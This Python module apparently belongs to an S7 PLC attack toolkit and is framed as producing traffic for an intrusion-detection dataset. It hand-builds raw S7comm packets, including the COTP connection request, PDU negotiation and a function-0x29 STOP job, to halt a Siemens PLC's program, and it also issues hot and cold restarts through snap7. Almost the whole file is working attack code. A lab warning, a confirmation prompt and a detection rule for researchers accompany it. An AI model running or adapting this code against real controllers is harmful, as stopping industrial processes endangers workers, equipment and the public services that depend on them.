from __future__ import annotations
"""
cpu_control.py – PLC CPU State Control Attack
----------------------------------------------
Sends S7comm control-plane PDUs to change the operating state of the
PLC CPU: STOP (halt all program execution), COLD START, or HOT START.

MITRE ATT&CK for ICS
---------------------
  Tactic    : Impact
  Technique : T0816 – Device Restart/Shutdown

Why this matters for dataset
-----------------------------
This attack generates a unique, rare PDU signature:
  - S7 ROSCTR = 0x01 (JOB) + function_code = 0x29 (STOP command)
  - Or function_code = 0x28 (INSERT_BLOCK = used for RESTART)
  - Extremely low packet count (1–3 packets) → feature: low volume, high impact
  - After STOP: no more READ/WRITE responses from PLC (silence)
  - feature: `plc_response_timeout` spikes immediately after

In dataset terms: one-packet class with unique function_code value.
A simple rule `if function_code == 0x29: ALERT` achieves 100% recall
– this becomes a strong baseline comparison in a research paper.

Usage
-----
  cpu_control status               # query current CPU state (SAFE, no change)
  cpu_control stop                 # send STOP command
  cpu_control start [--cold]       # send HOT or COLD START

  ⚠  cpu_control stop will HALT the PLC program.
     Use only on a test/lab device.
"""

import time
import struct
from typing import List

# Import utils trước để đảm bảo snap7.dll được load sắn trên Windows
from s7pwn.runtime import get_current_target
from s7pwn.utils import s7_connect   # side-effect: auto-loads snap7.dll
import snap7
from snap7.type import Areas


# ─────────────────────────────────────────────────────────────────
#  S7 raw PDU builders
#  S7 comm: TPKT + COTP + S7 header + parameter
#  References:
#    - snap7 source (libnodave legacy)
#    - Thomas Roth "Fuzzing the S7 Protocol" TROOPERS 2016
# ─────────────────────────────────────────────────────────────────

_TPKT_COTP_HEADER = bytes([
    # TPKT
    0x03, 0x00,       # version=3, reserved=0
    0x00, 0x21,       # length = 33 (will be adjusted per PDU)
    # COTP
    0x02,             # COTP header length = 2
    0xF0,             # COTP PDU type = DT DATA
    0x80,             # TPDU number + EoT flag
])

def _build_stop_pdu() -> bytes:
    """
    S7 JOB request with function 0x29 (PLC Stop).
    Payload: 'P_PROGRAM' service name for graceful stop.
    """
    s7_body = bytes([
        0x32,       # S7 magic
        0x01,       # ROSCTR = JOB
        0x00, 0x00, # redundancy ID
        0x01, 0x00, # PDU reference
        0x00, 0x08, # parameter length = 8
        0x00, 0x00, # data length = 0
        0x29,       # function = PLC STOP
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x09,       # service name length
        0x50, 0x5F, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,  # "P_PROGRAM"
    ])
    tpkt_len = 4 + len(bytes([0x02, 0xF0, 0x80])) + len(s7_body)
    tpkt = bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF,
                  0x02, 0xF0, 0x80])
    return tpkt + s7_body

def _build_cold_start_pdu() -> bytes:
    """S7 JOB request with function 0x28 (INSERT_BLOCK / RESTART)."""
    s7_body = bytes([
        0x32, 0x01, 0x00, 0x00,
        0x02, 0x00,
        0x00, 0x08, 0x00, 0x00,
        0x28,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x09,
        0x50, 0x5F, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D,
    ])
    tpkt_len = 4 + 3 + len(s7_body)
    tpkt = bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF,
                  0x02, 0xF0, 0x80])
    return tpkt + s7_body


# ─────────────────────────────────────────────────────────────────
#  Sub-commands
# ─────────────────────────────────────────────────────────────────

def _status(ip: str, rack: int, slot: int) -> None:
    """Query and display current CPU state – no changes made."""
    c = s7_connect(ip, rack, slot)
    if not c:
        print("[!] Connection failed."); return
    try:
        # get_cpu_state() trả về:
        #   - python-snap7 >= 1.x: string enum  'S7CpuStatusRun' / 'S7CpuStatusStop' / 'S7CpuStatusUnknown'
        #   - python-snap7  < 1.x: integer       0x08 / 0x04 / 0x00
        try:
            state = c.get_cpu_state()
            # Chuẩn hoá về string
            state_s = str(state)
            if "Run" in state_s:
                state_str = "RUN"
            elif "Stop" in state_s:
                state_str = "STOP"
            elif "Unknown" in state_s:
                state_str = "UNKNOWN"
            else:
                # Fallback: thử parse integer (phiên bản cũ)
                try:
                    state_map = {0x08: "RUN", 0x04: "STOP", 0x02: "HALT", 0x00: "UNKNOWN"}
                    state_str = state_map.get(int(state), f"0x{int(state):02x}")
                except (ValueError, TypeError):
                    state_str = state_s
            print(f"[*] CPU State: {state_str}")
        except Exception as e:
            print(f"[*] CPU State: UNKNOWN ({e})")

        # get_cpu_info() — trả về struct hoặc bytes tuỳ phiên bản
        try:
            info = c.get_cpu_info()
            def _d(x):
                if isinstance(x, (bytes, bytearray)):
                    return x.decode(errors='replace').strip().rstrip('\x00')
                return str(x).strip()
            print(f"[*] Module Type : {_d(info.ModuleTypeName)}")
            print(f"[*] Module Name : {_d(info.ModuleName)}")
            print(f"[*] Serial No   : {_d(info.SerialNumber)}")
            print(f"[*] AS Name     : {_d(info.ASName)}")
        except Exception:
            print(f"[*] Module Info : Not available")

        print(f"[*] Target      : {ip}  rack={rack}  slot={slot}")
        print(f"[+] Connection  : OK")

    except Exception as e:
        print(f"[!] Status query failed: {e}")
    finally:
        try: c.disconnect()
        except Exception: pass



def _stop(ip: str, rack: int, slot: int) -> None:
    """Send S7 STOP PDU to halt PLC execution."""
    import socket

    print(f"[!] Sending STOP command to {ip}...")
    print("[!] This will HALT all PLC program execution.")
    confirm = input("[?] Confirm? (yes/no): ").strip().lower()
    if confirm != "yes":
        print("[*] Aborted."); return

    pdu = _build_stop_pdu()
    t0 = time.time()

    # Low-level TCP send (bypassing snap7 to see raw response)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((ip, 102))

        tsap_dst_byte = (rack * 0x20) + slot
        # COTP connection request (ISO 8073)
        cotp_cr = bytes([
            0x03, 0x00, 0x00, 0x16,  # TPKT
            0x11, 0xE0, 0x00, 0x00,  # COTP CR
            0x00, 0x01, 0x00,
            0xC0, 0x01, 0x0A,
            0xC1, 0x02, 0x01, 0x00,
            0xC2, 0x02, 0x01, tsap_dst_byte,
        ])
        sock.sendall(cotp_cr)
        resp = sock.recv(1024)

        # Send S7 PDU negotiate
        neg = bytes([
            0x03, 0x00, 0x00, 0x19,
            0x02, 0xF0, 0x80,
            0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08,
            0x00, 0x00, 0xF0, 0x00, 0x00, 0x01, 0x00, 0x01,
            0x01, 0xE0,
        ])
        sock.sendall(neg)
        resp = sock.recv(1024)

        # Send STOP
        sock.sendall(pdu)
        resp = sock.recv(1024)

        elapsed = time.time() - t0
        if len(resp) > 0 and resp[0] == 0x03:
            print(f"[+] STOP PDU sent and ACK received ({elapsed*1000:.1f}ms)")
            print(f"[+] PLC should now be in STOP state.")
        else:
            print(f"[?] Unexpected response: {resp.hex()}")

    except ConnectionRefusedError:
        print("[!] Connection refused – PLC may already be stopped.")
    except Exception as e:
        print(f"[!] Raw send failed: {e}")
        print("[*] Trying via snap7 fallback...")
        _stop_via_snap7(ip, rack, slot)
    finally:
        try: sock.close()
        except Exception: pass


def _stop_via_snap7(ip: str, rack: int, slot: int) -> None:
    c = s7_connect(ip, rack, slot)
    if not c:
        print("[!] snap7 connect failed."); return
    try:
        c.plc_stop()
        print("[+] snap7 plc_stop() sent.")
    except Exception as e:
        print(f"[!] snap7 stop failed: {e}")
    finally:
        try: c.disconnect()
        except Exception: pass


def _start(ip: str, rack: int, slot: int, cold: bool) -> None:
    mode = "COLD" if cold else "HOT"
    print(f"[*] Sending {mode} START to {ip}...")
    c = s7_connect(ip, rack, slot)
    if not c:
        print("[!] Connection failed."); return
    try:
        if cold:
            c.plc_cold_start()
        else:
            c.plc_hot_start()
        print(f"[+] {mode} START sent.")
    except Exception as e:
        print(f"[!] Start command failed: {e}")
    finally:
        try: c.disconnect()
        except Exception: pass


# ─────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────

def cpu_control(args: List[str]) -> None:
    if not args:
        print("Usage: cpu_control <status|stop|start> [--cold]")
        print("  status         Query CPU state (safe, read-only)")
        print("  stop           Send STOP command (halts PLC execution)")
        print("  start [--cold] Send HOT or COLD START")
        return

    sub  = args[0].lower()
    cold = "--cold" in args

    t = get_current_target()
    if not t:
        print("[!] No target. Use 'set_target' or 'select'."); return

    ip   = t["ip"]
    rack = t.get("rack", 0)
    slot = t.get("slot", 1)

    print(f"[*] CPU Control  target={ip}  rack={rack}  slot={slot}")
    print(f"    MITRE ATT&CK ICS T0816 – Device Restart/Shutdown\n")

    if sub == "status":
        _status(ip, rack, slot)
    elif sub == "stop":
        _stop(ip, rack, slot)
    elif sub == "start":
        _start(ip, rack, slot, cold)
    else:
        print(f"[!] Unknown sub-command '{sub}'. Valid: status | stop | start")
